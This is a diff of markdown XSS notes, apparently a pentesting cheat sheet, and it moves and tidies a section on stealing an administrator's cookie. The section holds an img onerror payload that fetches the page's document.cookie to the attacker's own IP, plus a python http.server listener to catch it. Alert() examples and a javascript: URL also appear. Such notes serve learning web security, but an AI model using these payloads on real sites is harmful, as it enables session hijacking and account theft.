@@ -23,6 +23,15 @@ Also, we can use the onclick javascript's function. If we upload an image with a
 <img src"<valid url>" onclick=alert("hi") />
 ```
 
+# Obtaining Cookies
+If we can introduce XSS code into a petition that will be processed by the administration server, we can try to obtain it's cookie by running the following code: 
+```bash
+<img src=x onerror=fetch("own_ip:port/"+document.cookie);>
+```
+With this petition we induce the victim server to execute JS code. With this code the server tries to execute  a wrong image and on the error sends it's cookie to our machine. Before executing this payload is necessary to open a local port.
+```bash
+python3 -m http.server 80
+```
 # SVG script
 When this code is injected into a web page, the SVG image will be loaded, and as soon as it's loaded, the `onload` event will fire, executing the JavaScript code and displaying the "1" in a pop-up alert box. It uses an SVG (Scalable Vector Graphics) element to trigger the JavaScript alert.
 
@@ -48,12 +57,3 @@ The code executes on the client side, within the user's browser. It doesn't rely
 
 If an attacker can inject this code into a web page by manipulating user-generated content (e.g., through input fields or URLs), the injected code will execute within the user's browser. For example, an attacker might craft a URL like `https://example.com/?input=javascript:alert(document.cookie)` and trick a user into clicking it.
 
-# Obtaining Cookie
-If we can introduce XSS code into a petition that will be processed by the administration server, we can try to obtain it's cookie by running the following code: 
-```bash
-<img src'x' onerror=fetch('http://<own-ip>:<port>/+document.cookie);>
-```
-With this petition we induce the victim server to execute JS code. With this code the server tries to execute  a wrong image and on the error sends it's cookie to our machine. Before executing this payload is necessary to open a local port.
-```bash
-pyton3 -m http.server 80
-```
